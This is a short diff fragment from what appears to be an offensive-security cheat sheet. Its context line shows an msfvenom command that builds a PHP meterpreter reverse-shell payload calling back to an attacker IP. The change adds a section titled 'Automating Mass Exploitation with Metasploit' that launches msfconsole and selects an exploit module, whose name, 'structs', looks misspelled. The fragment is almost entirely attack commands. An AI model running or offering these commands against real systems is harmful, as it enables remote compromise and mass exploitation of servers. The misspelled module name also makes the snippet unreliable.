@@ -260,4 +260,9 @@ msfvenom -p php/meterpreter/reverseshell_tcp LHOST=your_ip LPORT=4444 -f raw > s
 ```
 
 ---
-# 20.Automating Mass Exp
+# 20.Automating Mass Exploitation with Metasploit
+
+```
+msfconsole
+use exploit/multi/http/structs
+```
